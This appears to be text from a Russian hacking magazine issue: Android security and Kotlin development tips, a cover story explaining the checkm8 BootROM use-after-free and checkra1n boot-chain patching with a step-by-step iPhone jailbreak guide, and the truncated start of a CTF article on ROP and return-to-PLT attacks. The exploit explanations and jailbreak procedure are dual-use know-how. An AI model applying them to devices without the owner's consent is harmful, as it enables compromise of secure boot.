 • Про файлинг дебаг‑сбо рок — это нормально. Обычно при профай‐
   линге приложения раз работчики не обращают внимания, что имеют дело
   с debug‐сборкой. В результате они анализируют производительность
   неоптимизированного кода и получа ют неверные результаты профайлин‐
    га.
 • У  MultiDex-приложе ний более мед ленный холод ный  старт.
  При превышении лимита на количество методов компилятор разбивает
   приложение на нес колько исполняемых фай лов DEX. Считается, что
   это замедляет старт приложения. На деле если такой эффект и есть, то он
   проявляется только при наличии сотен фай лов DEX. С другой стороны,
   MultiDex‐приложения занимают на несколько процентов больше опе‐
   ративной и постоянной памяти.





      Оптимизация аллокато ра объектов (Android 4.4 — Android 10)


              РАЗРАБОТЧИКУ


Бе зопасность коммуникаций
Securing Network and Inter‐App Communications on Android — вводная статья
о том, как обезопасить коммуника цию при ложения с сетевым сервером и с
другими приложе ниями.
  Одна из основных проб лем сетевой коммуникации заключается в воз‐
можности перехвата трафика, поэтому первое, что необ ходимо сделать
при разработке приложения, — добавить файл сетевой конфигурации,
который запретит использовать незашифрованные подключения (начиная
с Android 7.0). Сам файл может иметь произволь ное имя, но дол жен рас‐
полагаться в каталоге res/xml. Также на него нужно сослаться из манифеста:


<?xml version="1.0" encoding="utf‐8"?>
<manifest ... >
    <application
         android:networkSecurityConfig="@xml/config"
         ...>
        ...
    </application>
</manifest>

Далее приведен файл конфигурации, который запрещает незашифрованный
трафик для всех доменов за исключением  localhost, а также позволяет
использовать для debug‐сборок собственный центр сертификации. Необя‐
зательно включать в кон фиг все эти опции.


<?xml version="1.0" encoding="utf‐8"?>
<network‐security‐config>
    <!‐‐ Запретить незашифрованный трафик для всех доменов, кроме
перечисленных в исключениях ‐‐>
    <base‐config cleartextTrafficPermitted="false" />


    <!‐‐ Домены, с которыми разрешен обмен незашифрованным трафиком
‐‐>
    <domain‐config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">localhost</domain>
        <trust‐anchors>
            <!‐‐ Кроме системных, также доверяем сертификату из
файла debug_certificate ‐‐>
            <certificates src="system" />
            <certificates src="@raw/debug_certificate" />
        </trust‐anchors>
    </domain‐config>


    <!‐‐ Debug‐версия приложения будет доверять также нашему
собственному CA ‐‐>
    <debug‐overrides>
        <trust‐anchors>
            <certificates src="@raw/my_ca"/>
        </trust‐anchors>
    </debug‐overrides>


</network‐security‐config>

Конфигурационный файл также можно использовать для Certiﬁcate Pinning.
Это нужно для того, чтобы приложение могло удос товериться, что удаленный
сервер действительно использует настоящий сертификат безопасности.
Для этого надо получить хеш SHA‐256 этого сертификата и прописать его
в нужное поле (его можно узнать с помощью бра узера):


<domain‐config>
    <domain includeSubdomains="true">website.net</domain>
    <pin‐set expiration="2020‐04‐16">
        <pin digest="SHA256">хеш</pin>
        <pin digest="SHA‐256">хеш</pin>
     </pin‐set>
</domain‐config>

Обмен данными между приложениями тоже необ ходимо защищать. Стандар‐
тный механизм обмена сообщениями в Android — это интенты (intent). Они
позволяют отправить другому приложению (или группе приложений) сооб‐
щение или вызвать ту или иную функцию. Интенты могут быть направле ны
одному приложению или быть широковещательными (я отправляю сооб‐
щение системе, и она пусть разбирается, кому сооб щение предназначено, —
например, вызовет стандартный браузер, чтобы открыть указанную веб‐стра‐
ницу). Проблема с широковещательными интента ми в том, что их могут
получить приложения, с которыми не стоит обмениваться информацией. Что‐
бы решить проблему, можно вызвать диалог выбора, и тогда пользователь
сможет сам указать приложение, которое дол жно получить интент:


val intent = Intent(Intent.ACTION_SEND)
val activityList = packageManager.queryIntentActivities(intent,
PackageManager.MATCH_ALL)
when {
    activityList.size > 1 ‐> {
        val chooser = Intent.createChooser(intent, "Choose an App")
        startActivity(chooser)
    }
    intent.resolveActivity(packageManager) != null ‐> startActivity(
intent)
    else ‐> Toast.makeText(this, "No App to launch with", Toast.
LENGTH_LONG).show()
}

Но что, если ты хочешь защитить приложение от получения любых интентов,
кроме отправленных другими твоими приложениями (например, ты реали‐
зовал систему плагинов)? Для это го можно соз дать новое полномочие
и автоматически предоставить его при ложениям, подписанным тем же клю‐
чом.
  Сначала объявляем разрешение:


<permission android:name="packageName.HelloWorldPermission"
            android:protectionLevel="signature" />

Затем защищаем с его помощью нужный компонент приложе ния:


<provider android:name="android.support.v4.content.FileProvider"
          ...
          android:permission="packageName.HelloWorldPermission"/>

В данном случае мы защитили ContentProvider, но также его можно сделать
совсем невидимым для дру гих приложений с помощью атрибута android:
exported="false".

Польза фун кций‑расширений
Kotlin extension functions: more than sugar — краткая статья о пользе фун‐
кций‐расширений Kotlin. Тех самых, что поз воляют добавить метод к любому
классу (своему или чужому) на лету.
 • Функции‐расширения  улучшают  читаемость  кода. Например,  строка
  string.emojify() выглядит явно лучше, чем emojify(string), и тем
   более лучше, чем StringUtils.emojify(string).
 • Функции‐расширения позволяют сделать класс легче и удобнее для чте‐
   ния и понимания. Если, например, какой‐то набор приватных методов
   класса нужен только одному публичному методу, их вмес те с публичным
  методом можно вынес ти в рас ширения.
 • Функции‐расширения облегча ют написа ние кода, так как IDE будет авто‐
   матически подсказывать, какие методы и функции‐расширения  есть
   у класса.

Классы‑делегаты в Kotlin
Kotlin Delegates in Android: Utilizing the power of Delegated Properties in Android
development — статья о делегированных свой ствах в Kotlin и о том, как их
можно применять при разработ ке для Android.
  Делегированные свойства — это поля клас са (или глобальные перемен‐
ные), обращение к которым вызовет код специального клас са‐делегата.
Простейший пример использования делегированных свойств будет выг‐
лядеть так:


class TrimDelegate : ReadWriteProperty<Any?, String> {


    private var trimmedValue: String = ""


    override fun getValue(
        thisRef: Any?,
        property: KProperty<*>
    ): String {
        return trimmedValue
    }


    override fun setValue(
        thisRef: Any?,
        property: KProperty<*>, value: String
    ) {
        trimmedValue = value.trim()
    }
}

Все, что делает этот класс‐делегат, — триммит строку (отбрасывает началь‐
ные и конечные пробелы), записанную в переменную. Далее, если объявить
переменную, исполь зуя этот класс‐делегат, записанные в нее строки будут
автоматически триммиться:


var param: String by TrimDelegate()
param = "  string  "

В Android делегированные свойства очень удоб но использовать для обра‐
щения к опциям с помощью SharedPreferences. Просто создай следующую
функцию‐расширение для клас са SharedPreferences:


fun SharedPreferences.string(
    defaultValue: String = "",
    key: (KProperty<*>) ‐> String = KProperty<*>::name
): ReadWriteProperty<Any, String> =
    object : ReadWriteProperty<Any, String> {
        override fun getValue(
            thisRef: Any,
            property: KProperty<*>
        ) = getString(key(property), defaultValue)
        override fun setValue(
            thisRef: Any,
            property: KProperty<*>,
            value: String
        ) = edit().putString(key(property), value).apply()
    }

Объяви переменную, которая будет привяза на к нужной опции, и просто
записывай/читай значения. Они будут автоматически сохранены в файл нас‐
троек:


var option3 by prefs.string(
        key = { "option3" },
        defaultValue = "default"
    )


option3 = "new_value"


             ИНСТРУМЕНТЫ


 • Can My Phone Run Linux? — сайт, поз воляющий узнать, поддерживает ли
   твое устройство уста новку стороннего дистрибутива Linux (OpenEmbed‐
   ded, PostmarketOS, Ubuntu Touch и так далее);
 • Frizzer — фаззер общего наз начения, основанный на Frida;
 • WhatsDump — скрипт для извлечения ключа шифрования WhatsApp;
 • iOS‐related scripts — набор скриптов для реверса iOS.


              БИБЛИОТЕКИ


 • FreeReﬂection — библиотека, позволя ющая обойти ограничение на дос туп
   к скрытым API с помощью рефлексии (в Android 9 и 10);
 • StringPacks — библиотека для более эффективного хранения строк
   перевода в пакете (раз работчик — WhatsApp);
 • Croppy — экран обрезки изоб ражений;
 • LiquidSwipe — красивая анимация перехо да между страницами ViewPager;
 • EasyReveal — библиотека для эффектной смены заднего фона приложе‐
   ния;
 • Shortcut — библиотека для удоб ного соз дания динамических ярлыков при‐
   ложения (те, что показываются при долгом удержании иконки);
 • ChiliPhotoPicker — библиотека для выбора фотографий на карте памяти;
 • FlipTabs — простой и эффектный переключатель между двумя табами;
 • Recycleradapter‐generator —  автоматический  генератор  адаптеров
   для RecyclerView;
 • IndicatorScrollView — ScrollView, визуально реагирующий на промотку экра‐
   на;
 • StoryView — библиотека, реализующая сториз а‐ля Instagram;
 • Falcon — библиотека для LRU‐кеширования сериализуемых объ ектов
   в памяти и на диске;
 • Flow‐preferences — версия Rx‐preferences, переписанная на Kotlin Flow
   API;
 • FlowRiddles — набор заданий для изучения Kotlin Flow API.
COVERSTORY
   ШАХ
  И МАТ





      КАК УСТРОЕН НАШУМЕВШИЙ
     ЭКСПЛОИТ CHECKM8 И КАК ИМ
        ВОСПОЛЬЗОВАТЬСЯ




Пользователи айфонов прекрасно знают,
зачем нужен джейлбрейк. Доступ к фай‐
ловой сис теме в iOS позволяет устанав‐
ливать приложения из сторонних репози‐
ториев и гибко менять настройки, которые       Валентин Холмогоров                                                                                               valentin@holmogorov.ru
обычно недос тупны. До недав него времени
джейла для iOS 13 не существовало. Точ‐
нее, до тех пор, пока хакер axi0mX не обна‐
ружил уязвимость checkm8 и не объяснил,
как можно заюзать ее на бла го прогрессив‐
ной общественности. А сегодня мы расска‐
жем об этой находке тебе и покажем, как с
ней обращать ся.


КОРРОЗИЯ ЖЕЛЕЗА
Название  уязвимости  checkm8  произно сится  по‐английски  примерно
как checkm‐eight, что созвучно со сло вом checkmate — «шах и мат», сим‐
волизирующим окончание шахматной партии. Отсю да и характерный логотип
одноименного экспло ита в виде опро кинутой фигуры шахматного короля.
«Игра окончена, ребята из Купертино, — как бы намекают нам авторы спло‐
ита, — you lose».
  Самое интересное во всей этой истории с checkm8 то, что уязвимость
была обнаружена не на прог раммном, а на аппа рат ном уровне яблочной тех‐
ники, причем охватывает она очень большой диапазон моделей, начиная
с самых древних устройств на чипе А5 вроде iPhone 4S и заканчивая впол не
современным iPhone X.
  Дыра прячется в механизме BootROM, который играет ключевую роль
в процессе загрузки айфонов и айпадов. Причем пофиксить ее программны‐
ми заплатками невозможно: для того чтобы решить проблему, нужно перес‐
мотреть аппаратную конфигура цию самого девайса, чего, как ты понимаешь,
за пару месяцев никак не сделать. На мой взгляд, checkm8 — это крупнейший
факап Apple со времен трояна Flashback, заразившего и объединившего
в ботнет почти 500 тысяч маков под управлением OS X по всему миру. Но тог‐
да, в 2012 году, все успешно раз решилось обновлением Java‐машины в mac‐
OS, уязвимость в которой и использовал трой. Сей час у Apple уже не получит‐
ся соскочить столь же легко и элегантно.


ИСТОРИЯ С ГЕОГРАФИЕЙ
О checkm8 известно уже давнень ко. Первые упоминания об уязвимости
в BootROM яблочных мобильных устройств появились в Сети 27 сен‐
тября 2019 года, когда axi0mX публично со общил в твиттере о своей находке.
Горячую новость тут же подхватили многочисленные сайты и даже авторитет‐
ные СМИ, громко заявившие о появлении универ сального джей лбрейка
для целого зоопарка смартфонов от Apple. На самом деле пол ноценного
джейла на тот момент еще не существовало: экспериментируя с DFU, axi0mX
обнаружил аппаратную уяз вимость, которую потенциально можно исполь‐
зовать для взлома файловой системы iOS.
  Сперва с помощью checkm8 нельзя было сделать практически ничего,
кроме замены стандартной загрузочной картинки iPhone в виде надкусанного
яблока на что‐то более оригинальное. Полноценный джейлбрейк с воз‐
можностью установки Cydia был представлен толь ко 8 ноября на конферен‐
ции POC2019 в Сеуле, да и тот пока еще находит ся в состоянии бета‐тес‐
тирования.
  В разработке джейла на основе checkm8 принимала участие целая коман‐
да исследователей, объединенная под общим названием checkra1n. В нее,
помимо самого axi0mX и известного iOS‐исследователя и талантливого
хакера Луки Тодеско (qwertyoruiop), вхо дит еще как минимум десяток человек,
о чем красноречиво свидетельствует раз дел Credits на сайте этой банды.





      Вот эти крутые ребята сделали джейлбрейк на основе checkm8

На сегодняшний день бета‐версия раз работанного командой checkra1n
джейлбрейка позволя ет взломать устройства с  установленной iOS  13,
начиная с iPhone 6S и заканчивая Х — на более ранних девайсах утилита
не тестировалась. Как про исходит этот взлом и на каких принципах он осно‐
ван? Давай разбираться.


РАЗ, ДВА, ТРИ, ЧЕТЫРЕ, ПЯТЬ, НАЧИНАЕМ ЗАГРУЖАТЬ…
Для пользователя загрузка айфона выг лядит крайне просто: нажал на кнопоч‐
ку — и спустя пару секунд на экра не появляется при вычный интерфейс iOS.
С технической точки зрения все немного сложнее.
  За начальный этап запуска яблочного устройства отвечает так называ‐
емый SecureROM, он же BootROM. Это — самый первый код, который запус‐
кается при холодной загрузке в Application Processor. Фактичес ки он пред‐
ставляет собой урезанную и упрощен ную версию загрузчика iBoot. Основная
задача SecureROM — получить образ загрузчика из энергонезависимой
памяти и передать ему управление. Этот код хранится непос редственно
в чипе на аппаратном уровне, доступен только на чтение и потому не может
быть изменен никаким обра зом извне. SecureROM — это самый доверенный
код в Application Processor, который выполняется без каких‐либо проверок.
Он же отвечает за переход устройства в сервисный режим восстановления
DFU (Device Firmware Update), активизируемый нажатием специальной ком‐
бинации кно пок при включении девайса. Для нас важно, что в режиме DFU
доступна загрузка на устройство файлов через интерфейс USB.
  Архитектурно SecureROM представляет собой первое зве но цепочки
безопасной загрузки, придуманной Apple для защиты от самого главного
врага яблочных мобиль ных устройств — вредонос ных программ и джей‐
лбрейков. В SecureROM вшит криптографичес кий ключ Apple, используемый
для расшифров ки образов, которые задей ство ваны на последующих этапах
загрузки, а также име ется необходимый инстру ментарий для работы с крип‐
тоалгоритмами. Получив управление от SecureROM, загрузчик iBoot рас‐
шифровывает и запускает ядро операционной сис темы, после чего загружа‐
ется образ самой iOS с графичес ким интерфей сом пользовате ля. Однако все
эти этапы запуска iPhone или iPad выполняются, толь ко если ини циализация
SecureROM прошла успешно.





      Так выглядят «этапы большого пути» — загрузки устрой ства с iOS

Именно поэтому все существо вавшие до откры тия checkm8 джейлбрейки
старались  всячески  обойти  этот  механизм.  Ведь  их  первоочеред ная
задача — загрузить пропатченный образ iOS, допускающий установку прог‐
рамм из сторонних источников, чего не должно происходить с использовани‐
ем SecureROM, стоящего на страже безопасной загрузки. Именно пол ный
контроль над про цессом запуска операционной системы гарантирует невоз‐
можность проникновения на устройство всевозможных буткитов, руткитов
и прочей подобной малвари, отсутстви ем которой всегда и славилась
мобильная плат форма от Apple.


ПРОТОКОЛ DFU
Как уже упоминалось, режим восста новления яблочного девайса DFU
используется, если невоз можна штатная  загрузка айфона или айпада,
и допускает обмен данными между компь ютером и устройством через
интерфейс USB. Для организации этого обмена в Купертино придумали спе‐
циальный протокол DFU. С его помощью можно залить на окирпиченный
айфон новую прошив ку, вос ста новить телефон из резервной копии или обно‐
вить операционную систему.
  Протокол DFU загружа ет с компь ютера на яблочный девайс блоки данных
с образом прошивки по запросу 0x21, 1. Когда заг рузка пол ностью завер‐
шается,  запрашивается сос тояние  устройства, после  чего соединение
по USB разрывается, устройство выходит из режима DFU, перезапускается
и пытается загрузить полученный образ прошивки. Это если процесс про‐
текает в штатном режиме. Однако исследователи заметили, что выйти из DFU
можно и другими способами, например по запросу 0x21, 4 (DFU abort).
В этом случае выполняется форсированное завершение режима восстанов‐
ления устройства.
  При передаче данных протокол DFU использует режим, который носит
наименование USB Control Transfer. Соеди нение ини циализируется с исполь‐
зованием установоч ного пакета (Setup Stage) длиной 8 байт, структура
которого показана на следующей картинке.




           Структура установочного пакета USB Control Transfer

Назначение всех полей этого пакета нам сейчас не принципиально — кроме
самого последнего. Если зна чение wLength ненулевое, сразу за установоч‐
ным пакетом следует ста дия данных (Data Stage), то есть данные пойдут
с компьютера на устройство или обратно (направление опре деляется зна‐
чением bmRequest Type). Эти данные передаются последовательно фраг‐
ментами размером от 8 до 64 байт в зависимости от скорос ти USB‐соеди‐
нения. Сессия передачи данных завершается ста дией проверки статуса тран‐
закции (Status Stage), на которой стороны обменива ются пакетами нулевой
длины.
  В USB‐стеке iBoot временный буфер выделяется в момент ини циализации
USB и пакеты, передаваемые в фазе данных, загружаются в него непосредс‐
твенно «на входе». Важный момент сос тоит в том, что USB‐стек включается
сразу, как только устрой ство переходит в режим DFU. Выделенный буфер
используется для временного хра нения информации на стадии данных. Пос‐
ле передачи управления указатель на этот буфер (и размер ожи даемых дан‐
ных) копируется в глобальную переменную, которую USB‐стек использует
как место назначения для пакетов, пос тупа ющих на устройство в фазе дан‐
ных. Как только устрой ство выходит из режима DFU, USB‐стек снова выключа‐
ется. Однако гло бальная переменная при этом не обну ляется! Таким обра‐
зом исследователи нащупа ли классичес кую уяз вимость типа Use‐after‐Free
(UaF).


             INFO

                       Уязвимость  типа  Use‐after‐Free  обусловлена
                      методами   взаимодействия   с  динамической
                       памятью, или кучей (heap). Подробнее об этом
                       типе уязвимостей можно прочитать, например,
                       здесь.



УЯЗВИМОСТЬ
В этом и кроется баг, лежащий в основе checkm8. Если отправить на устрой‐
ство запрос Setup Stage, инициировать передачу данных, но, не начав эту
самую передачу, отправить девайсу запрос DFU abort (0x21, 4) на фор‐
сированный выход из DFU, то устройство попыта ется снова запуститься
в режиме DFU и завершить прерванную сес сию. При этом состояние памяти
останется инициализированным и мы  получаем возможность передать
на устройство, загрузить в память и выполнить произвольный код по адресу
буфера, выделенного до момента предыдущего выхода устройства из DFU.
  Поскольку вся программа, обеспечива ющая выделение буфера, работу
с кучей и структурами задач, хранится в SecureROM и исполня ется на аппа‐
ратном уровне, пофиксить эту ошиб ку попросту невоз можно. Шах и мат!
  Примечательно, что на девайсах с 32‐раз рядным ROM (A7, A10, A10X,
A11 и A11X) указанный механизм не работает, пос коль ку буфер там аллоциру‐
ется всякий раз в одном и том же мес те при каждой инициализации USB‐сте‐
ка. Тем не менее axi0mX нашел способ обойти такую пре допределенность
с использованием правиль но подобранного сценария эксплуатации Use‐af‐
ter‐Free.
  Для этого он использовал то обстоятельство, что система одновременно
может  инициализировать  нес колько  USB‐передач. Например,  в  ответ
на некоторые запросы устройство не сможет отпра вить данные, если получа‐
тель занят, до тех пор, пока конечная точка (endpoint) не освободится или не
будет сброшен USB, то есть не будут устра нены условия блокировки. Отправ‐
ленные в таком состоянии зап росы попадают в очередь. Пос ле устранения
блокировки выпол няется обход очереди и все зап росы поочередно завер‐
шаются. Информация о конечной точке (endpoint) обнуляется, а запросы
нулевой длины остаются в куче. Управляя запросами и тайм‐аутами, теоре‐
тически можно создать такие усло вия формирова ния кучи, которые в итоге
повлияют на следующее выделение памяти при соз дании буфера.
  Обобщая, можно сказать, что из‐за найденной в SecureROM ошиб ки
в механизме создания и уничтожения USB‐стека происходит утечка памяти,
которая может использоваться для формирования сос тояния кучи, дающего
возможность  управлять выделением  памяти  при  раз мещении  буфера.
В результате с помощью UaF можно выполнить запись в выделенную память
для получения контролиру емого косвенно го перехода  (controlled  indirect
branch) при выходе из DFU.


CHECKMATE
По принципу своего действия использующий эту уязвимость эксплоит check‐
m8 — типичный буткит. Основная его задача состоит в том, чтобы дать
устройству нормально загрузиться, но при этом скомпрометировать каждое
звено в цепочке загрузки пос ле того, как отра бота ет BootROM.
  В нормальном режиме BootROM переда ет управление загрузчику (iBoot),
который загружает в память ядро iOS и передает управление на точку входа.
Цель создателей сплоита — пропатчить ядро до того, как этот процесс завер‐
шится.
  Во время работы iBoot использует специальный режим (его называют boot
trampoline), который ненадолго воз вра щает про цес сор в «особое» сос‐
тояние: кеш сброшен, все регистры уста новлены в ноль, MMU отключен.
Команда checkra1n разработала особый метод размещения в памяти устрой‐
ства шелл‐кода и научилась использовать хуки при вызове некоторых фун‐
кций загрузчика, чтобы зас тавить его выполнить полез ную нагрузку.
  В итоге загрузчик подготавливает ядро и переводит процессор в сос‐
тояние boot trampoline перед вызовом точки входа. Но вместо нее с помощью
хука управление передается на заранее загруженный в память шелл‐код.
Теперь можно спо кой но пат чить ядро.
  Однако просто пропатчить ядро недостаточно: когда оно загрузится,
необходимо сохранить код в пользовательском режиме, чтобы можно было
выпол нить джейлбрейк. Для этого шелл‐код соз дает в памяти маленький вир‐
туальный диск, что бы перехватить выполнение команд в режиме EL0. Это поз‐
воляет изменить дерево устройств и структуру аргументов загрузки ядра
и потом использовать его в качес тве корневого устройства. Для реализации
этой идеи парням даже пришлось написать собственный динамический ком‐
поновщик.
  Для монтирования кор невой файловой системы поверх / используется
syscall(3). При этом применя ется каскадно‐объединенное монтирование
(union mounting), чтобы случайно не обру шить vnode. Пос ле всех этих манипу‐
ляций можно запускать произвольный код с идентификатором PID 1, прежде
чем  будет запущен  launchd.  Такой  код  ини циализируется ядром  iOS
перед всеми последующими процессами и является для них родительским.
Само собой, он обладает соот ветс твующими системны ми привилегиями.
  Ню анс в том, что на данном этапе смонтированная корневая файловая
система доступна только для чтения, а для нормальной работы джейлбрейка
нужно дропнуть в ФС несколько файлов, чтобы получить доступ к шеллу iOS
и позволить поль зователю уста новить менеджер пакетов. То есть необ‐
ходимо получить доступ к /private/var, для чего сначала инициализировать
механизм Data Рrotection, за который отвечает launchd.
   Чтобы добиться нужного результата, с использованием того же union
mounting поверх /usr/libexec/ монтиру ется еще один .dmg с целью пере‐
определить какой‐нибудь из системных демонов. В качестве жертвы был выб‐
ран sysstatuscheck, поскольку этот демон запускается в раз личных версиях
iOS в нужный момент — в начале заг рузочного про цес са, но дос таточно поз‐
дно, чтобы включить Data Рrotection. Когда задача выполнена, .dmg‐образ
принудительно размонтируется.
   Дальше можно позволить launchd продолжить загрузку в штатном режиме.
После включения usbmux и заг рузки всех необ ходимых утилит, позволя ющих
пользователю установить правильный bootstrap в своей корневой файловой
системе, можно запускать демон SSH и выполнять джейлбрейк. Дело сде‐
лано!


КАК ИСПОЛЬЗОВАТЬ CHECKM8
Итак, мы обсудили технические принципы, на которых базируется checkm8.
Настало вре мя взять в руки айфон с iOS 13 и посмотреть, как она работает
на практике.
  Поскольку checkra1n все еще находится в ста дии беты, он годится далеко
не для любых устрой ств Apple. Теоретичес ки с использованием checkra1n
можно взломать все айфо ны, начиная с iPhone 5S и заканчивая iPhone X,
а также планшетные компьютеры Apple. Но де‐факто он точно не работает
на iPad первого, пятого поколения, iPad Air 2, iPad Air 3, iPad Pro (11, 12.9‐3G)
и iPad mini 5. Кроме того, с помощью checkra1n не получится взломать
устройства, оборудованные процессором A12, A12X и A13, то есть iPhone XR,
XS, XS Max, 11, 11 Pro, 11 Pro Max.
  Поддержка iPhone 5S создателями джейла заявляется, но не гарантиру‐
ется. Рассматриваемый метод прекрасно работает с  iOS версий 13.0—
13.2.2, для более ранних редакций мобильной платформы Apple можно вос‐
пользоваться инструкцией из нашей предыду щей статьи.
   Сheckra1n — это полуотвязанный джейлбрейк (semi‐untethered jailbreak),
который слетит после перезагрузки или отключения питания устройства. Если
по какой‐либо причине ты решишь выключить свой айфон, программу
на телефоне, установка которой описана в этой статье, придется запустить
заново.


           WARNING

                      Вся информация в этой статье приведена исклю‐
                        чительно  в  образовательных   целях.  Автор
                      и редак ция не несут никакой ответственности
                        за любые последствия использования описанных
                       здесь действий. Помни: выполняя любые манипу‐
                      ляции со своим смартфоном, ты действуешь
                      исключительно на свой страх и риск.


Как и в случае с iOS 12, исполь зовать checkra1n невозможно на неактивиро‐
ванном и заблокированном устройстве. Если ты забыл пароль от учетной
записи Apple ID, самое время вспомнить или восстановить его.
  Для успешного взло ма яблочного девай са нам понадобится сам девайс,
компьютер или макбук под управлением macOS (в настоящий момент джейл
запускается только в этой системе, утилита для Windows и Linux находится
в стадии разработки) и примерно полчаса свободного времени. Итак, прис‐
тупим.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
         ШАХ И МАТ

              КАК УСТРОЕН НАШУМЕВШИЙ ЭКСПЛОИТ
            CHECKM8 И КАК ИМ ВОСПОЛЬЗОВАТЬСЯ





Под готовка
Чтобы обезопасить себя от неприятных неожиданностей, сде лай на вся кий
случай резервную копию своего телефона. Для это го запусти на компьютере
iTunes, подключи к нему iPhone при помощи шнура и подтверди на компьюте‐
ре и телефоне доверительные отношения связ ки этих устройств.





  Доверительные отношения нужно подтвердить сна чала на компьютере…





                           ...потом на самом iPhone

В окне iTunes щелкни мышью на значке телефона в верхней части левой
панели и в окне «Обзор» установи переключатель «Автоматичес кое создание
копий» в положение «Этот компьютер», пос ле чего нажми на кнопку «Создать
копию сейчас».





                 Создаем резервную копию iPhone

Теперь необходимо отключить на телефоне блокировку системы паролем,
Touch ID и Face ID. Для этого переходим в «Настройки», открываем раз дел
«Touch ID и код‐пароль», вво дим код‐пароль (если он есть), после чего вык‐
лючаем эти методы авто ризации. Код‐пароль, кста ти, тоже лучше на вся кий
случай отклю чить.





                 От клю чаем Touch ID и код‐пароль


           WARNING

                     Для успешного завершения процеду ры не запус‐
                       кай приложение iTunes до окончания процесса
                       взлома!


Все, больше никаких дополнитель ных действий не потребуется. Можно прис‐
тупать к джейлбрейку.


Джейлбрейк
На компьютере с macOS открой в бра узере ссылку https://checkra.in/releases/
и скачай актуальную версию утилиты — на момент написания статьи это была
версия 0.9.5 beta. Под клю чи телефон к устройству с помощью USB‐шну ра
и запусти скачанное приложение. Смонтируй dmg‐образ в сис теме, после
чего в открывшемся окне перетащи мышью значок checkra1n в папку
Applications.





                  Устанавливаем ути литу джей лбрейка

Если твоя macOS настроена по умолчанию  (то есть немного страдает
паранойей),  система не  позволит  запус тить при ложение,  загруженное
из интернета. Чтобы воспользоваться checkra1n, открой папку «Приложения»
(Applications) и щелкни мышью на значке программы, удерживая клавишу Ctrl,
после чего в появившемся диало говом окне нажми на кнопку «Открыть».





                  Программа успешно запустилась

Жмем Start. Приложение сооб щит нам о том, что мы дол жны перевес ти
телефон  в режим DFU, но перед этим необ ходимо переключить  его
в защищенный режим. Программа сделает это автоматически. Нажимаем
на кнопку Next и дожидаемся, пока на экра не аппа рата не воз никнет вот такая
веселая картинка.





                Телефон перешел в защищенный режим

Теперь нам предстоит самое интерес ное. Для выполнения следующего
упражнения нужно вклю чить на телефоне режим DFU, так что придется при‐
менить всю име ющуюся в твоем арсенале ловкость и скорость реакции.





                Переводим телефон в режим DFU

Отыщи на своем телефоне кнопку вклю чения питания (на моем iPhone 7 она
находится на правой боковинке корпуса) и кнопку уменьшения громкости
(она располагается на левой боковинке). Не отклю чая телефон от компьюте‐
ра, щелкни мышью на кнопке Start в окне checkra1n, пос ле чего быс тро нажми
и удерживай обе кнопки.
  Примерно через 4 секунды, когда в окне программы появится соответс‐
твующая команда, отпусти кнопку питания, но продол жай удерживать кнопку
уменьшения громкости еще в течение примерно 10 секунд. Ой, получилось —
именно такое изоб ражение мы видели на выложенных в Сети видеороликах,
демонстрирующих эксплуатацию уяз вимос ти checkm8!





                   Ма гия в действии…


           WARNING

                     На разных моделях iPhone и  iPad включение
                     режима DFU  может  осуществляться  немного
                        по‐разному. Во избежание сюрпризов точно сле‐
                       дуй инструк циям, демонстри руемым в окне прог‐
                   раммы checkra1n, а еще лучше — заранее загуг‐
                          ли, как включается DFU на твоем аппарате.


Телефон автоматически перезагрузится, пос ле чего в окошке checkra1n
появится сообщение о том, что джейлбрейк про шел успешно. Нажми Done.





                         Джейл удался

Теперь можно отсоединить телефон от компь ютера. Результатом всех наших
манипуляций стало появление значка приложения checkra1n на самом
телефоне.





           Программа checkra1n теперь живет в твоем айфоне

Запусти эту программу. В своей нынеш ней версии она пред лагает не так уж
много возможностей, вернее, всего одну: ска чать установщик пакетов Cydia.
Нажми на значок Cydia, затем — на надпись Install Cydia в нижней части окна
и дождись, пока приложение загрузит ся и установится на телефон. После
этого можно выйти из checkra1n и запустить Cydia с помощью значка на экра‐
не iOS.





                А вот и результат всех наших трудов!


ВЫВОДЫ
Как видишь, джейлбрейк iOS 13 с checkm8 и checkra1n прост, как дважды два,
однако стоит помнить, что в текущем виде это по‐прежнему бета. С нетер‐
пением ждем момента, когда раз работчики выпус тят новую версию, сов‐
местимую с другими платформами, как минимум — с Windows, а также
добавят в лоадер поболь ше полезных функций.
   Теоретически у это го экс плоита широкие перспективы: например, можно
попытаться организовать на мобильном устройстве Apple что‐то вроде dual
boot или, чем черт не шутит, водрузить на него какую‐нибудь кастомную сбор‐
ку операционной системы.
ВЗЛОМ





            PWN  В КОРОЛЕВСТВЕ
     ROP‐ЦЕПОЧКИ
  И АТАКА RETURN‐TO‐PLT
    В CTF BITTERMAN





В этой статье мы рассмотрим осо бен ности
переполнения  стека  в  64‐битном  Linux.
Сделаем мы это на примере таска Bitterman
с   соревнования  CAMP   CTF   2015.
С помощью модуля pwntools для Python мы             snovvcrash                                                                                        Безопасник, временами
построим эксплоит, в котором будут при‐        криптоана(рхист)литик,питонщик, местами по
менены  техники  Return‐oriented program‐       необходимостиадминистраторсистемный
ming  (для обмана  зап рета  исполнения        snovvcrash@protonmail.ch
DEP/NX) и Return‐to‐PLT — для байпаса
механизма рандомиза ции адресов ASLR
без брутфорса.


          PWNВ королевс тве
В этом цикле статей мы изу чаем раз ные аспекты атак типа «переполнение
стека». Читай также:
 • «Препарируем классику переполнения буфера в современных условиях»
 • «Обходим DEP и брутфорсим ASLR на вир туалке с Hack The Box»
 • «Атака ret2bss, криптооракулы и реверс‐инжиниринг на виртуал ке Smasher
   с Hack The Box»




ЛИКБЕЗ ПО СРЫВУ СТЕКА НА X86-64
Я составил целых три импровизированных кейса, поочередно изучив которые
ты получишь необходимые зна ния для PWN’а бинарника Bitterman.
  Первый кейс покажет отличия эксплуата ции Stack Smashing от этой же ата‐
ки в 32‐битной ОС (о которой мы говорили в первой части цикла) в случае,
когда у нарушителя есть возможность разместить и выпол нить шелл‐код
в адресном пространстве стека, — то есть с отклю ченными защитами DEP/NX
и ASLR.
   Второй кейс поможет разобраться в проведении атаки ret2libc на x86‐64
(ее 32‐битный аналог был рас смотрен во вто рой час ти). Здесь мы обсудим,
какие регистры использует 64‐битный ассемблер Linux при формировании
стековых кадров, а также пос мотрим, что собой представляет концепция Re‐
turn‐oriented programming (ROP). Механизм DEP/NX активен, ASLR — нет.
  В третьем кейсе я покажу вариацию ROP‐ата ки, цель которой — стриг‐
герить утечку адреса загрузки раз деляемой биб лиотеки libc (методика Re‐
